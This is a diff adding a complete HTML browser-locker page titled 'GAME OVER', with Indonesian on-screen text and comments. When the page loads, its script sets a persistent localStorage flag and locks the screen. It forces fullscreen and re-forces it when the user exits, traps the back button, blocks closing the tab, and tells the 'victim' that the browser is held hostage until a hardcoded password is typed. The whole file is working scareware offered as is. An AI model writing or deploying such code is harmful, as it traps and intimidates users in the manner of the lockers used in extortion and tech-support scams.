@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GAME OVER</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+            background-color: #000;
+            color: #ff0000;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        #lock-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            z-index: 9999;
+            display: none; /* Sembunyikan dulu, baru tampilkan dengan script */
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            cursor: none;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px 8px #ff0000;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        p {
+            font-size: 1.2em;
+        }
+        input[type="password"] {
+            padding: 10px;
+            font-size: 1.2em;
+            border: 2px solid #ff0000;
+            background-color: #111;
+            color: #ff0000;
+            margin-top: 20px;
+            text-align: center;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 1.2em;
+            margin-top: 15px;
+            cursor: pointer;
+            background-color: #ff0000;
+            color: #000;
+            border: none;
+            font-weight: bold;
+        }
+        #error-message {
+            color: #ff0000;
+            margin-top: 15px;
+            visibility: hidden;
+        }
+    </style>
+</head>
+<body>
+
+<div id="lock-screen">
+    <h1>KAU PIKIR BISA LARI?</h1>
+    <p>Browser ini telah disandera. Tidak ada jalan keluar.</p>
+    <input type="password" id="password-input" placeholder="Sandi Penderitaanmu...">
+    <br>
+    <button onclick="checkPassword()">COBA BEBASKAN DIRI</button>
+    <p id="error-message">SALAH! TETAPLAH DI SINI SELAMANYA!</p>
+</div>
+
+<script>
+    const lockScreen = document.getElementById('lock-screen');
+    const passwordInput = document.getElementById('password-input');
+    const errorMessage = document.getElementById('error-message');
+    const correctPassword = "rahman135";
+
+    // Fungsi untuk mengunci dan menampilkan layar
+    function engageLock() {
+        lockScreen.style.display = 'flex';
+        requestFullScreen(document.documentElement);
+        // Jebakan Sejarah Browser
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () {
+            history.go(1);
+        };
+    }
+
+    // Periksa apakah korban sudah terjebak sebelumnya
+    if (localStorage.getItem('isFucked') === 'true') {
+        engageLock();
+    }
+
+    // Fungsi untuk memeriksa kata sandi
+    function checkPassword() {
+        if (passwordInput.value === correctPassword) {
+            // Hapus kunci permanen
+            localStorage.removeItem('isFucked');
+            // Matikan jebakan sejarah
+            window.onpopstate = null;
+            // Sembunyikan layar kunci dan keluar fullscreen
+            lockScreen.style.display = 'none';
+            exitFullScreen();
+        } else {
+            errorMessage.style.visibility = 'visible';
+            passwordInput.value = "";
+            setTimeout(() => {
+                errorMessage.style.visibility = 'hidden';
+            }, 3000);
+        }
+    }
+
+    // Pemicu utama saat halaman pertama kali dimuat
+    window.onload = function() {
+        // Tanam kunci permanen di browser korban
+        localStorage.setItem('isFucked', 'true');
+        engageLock();
+    };
+
+    // Fungsi untuk meminta fullscreen
+    function requestFullScreen(element) {
+        if (element.requestFullscreen) element.requestFullscreen();
+        else if (element.mozRequestFullScreen) element.mozRequestFullScreen();
+        else if (element.webkitRequestFullscreen) element.webkitRequestFullscreen();
+        else if (element.msRequestFullscreen) element.msRequestFullscreen();
+    }
+
+    // Fungsi untuk keluar dari fullscreen
+    function exitFullScreen() {
+        if (document.exitFullscreen) document.exitFullscreen();
+        else if (document.mozCancelFullScreen) document.mozCancelFullScreen();
+        else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+        else if (document.msExitFullscreen) document.msExitFullscreen();
+    }
+    
+    // Mencegah penutupan tab dengan mudah
+    window.addEventListener('beforeunload', function (e) {
+        e.preventDefault();
+        e.returnValue = '';
+    });
+    
+    // Terus paksa fullscreen jika mereka mencoba keluar
+    document.addEventListener('fullscreenchange', (event) => {
+        if (!document.fullscreenElement) {
+            requestFullScreen(document.documentElement);
+        }
+    });
+
+    // Event listener untuk tombol Enter
+    passwordInput.addEventListener("keyup", function(event) {
+        if (event.key === "Enter") {
+            event.preventDefault();
+            checkPassword();
+        }
+    });
+
+</script>
+
+</body>
+</html>
